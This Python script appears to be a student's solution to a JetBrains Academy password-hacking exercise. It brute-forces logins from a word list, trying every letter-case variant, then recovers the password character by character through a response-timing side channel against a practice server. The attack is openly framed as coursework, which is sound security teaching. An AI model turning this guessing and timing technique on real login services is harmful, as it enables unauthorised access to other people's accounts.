import socket
import sys
import itertools
import json
import string
import time


class Socket:
    def __init__(self, host_name, port_num,):
        self.host = host_name
        self.port = port_num
        self.connection = None

    def connect(self):
        self.connection = socket.socket()
        self.connection.connect((self.host, self.port))

    def disconnect(self):
        self.connection.close()
        self.connection = None

    def send(self, message):
        message = message.encode()
        self.connection.send(message)

    def receive(self):
        buffer = 1024
        return self.connection.recv(buffer).decode()


def main():
    # we assume input is correct, becouse its from JBA
    ip_address = sys.argv[1]
    port = int(sys.argv[2])

    # create connection
    my_socket = Socket(ip_address, port)
    my_socket.connect()

    data = {"login": "admin", "password": " "}  # this is changed during hacking

    # read all the logins from file
    with open('logins.txt') as file:
        common_logins = [p.strip() for p in file.readlines()]

    # try all logins
    for word in common_logins:
        # create generator wit tuples(lowerletter,UPPERLETTER, digit remains same)
        low_up_combo = ((c.lower(), c.upper()) if c.isalpha() else c for c in word)
        # create all possible combinations of low and up letters(characters) in word
        combos = map(''.join, itertools.product(*low_up_combo))

        for login in combos:
            data["login"] = login

            # hacking round - sending and receiving data
            my_socket.send(json.dumps(data))
            json_string = my_socket.receive()
            received_dict = json.loads(json_string)
            result = received_dict["result"]

            if result == "Wrong password!":  # FOUND Login
                break
        else:
            continue
        break

    # login is known, try all the passwords
    all_symbols = string.ascii_letters + string.digits
    sure_password = ''
    for i in range(10):  # I assume there is no more than 10 characters
        for letter in all_symbols:
            try_password = sure_password + letter
            data["password"] = try_password

            # hacking round - sending and receiving data
            my_socket.send(json.dumps(data))

            # count how much time take to recieved response
            start_time = time.perf_counter()
            json_string = my_socket.receive()
            end_time = time.perf_counter()
            response_time = end_time - start_time

            received_dict = json.loads(json_string)
            result = received_dict["result"]
            if result == "Connection success!":  # found correct password!!!
                print(json.dumps(data))  # need to be shown in JSON format
                sys.exit()

            # if response takes longer, some kind of Exception is show, which
            # means bwe found next letter
            if response_time >= 0.1:
                sure_password += letter
                break

    my_socket.disconnect()


if __name__ == "__main__":
    main()
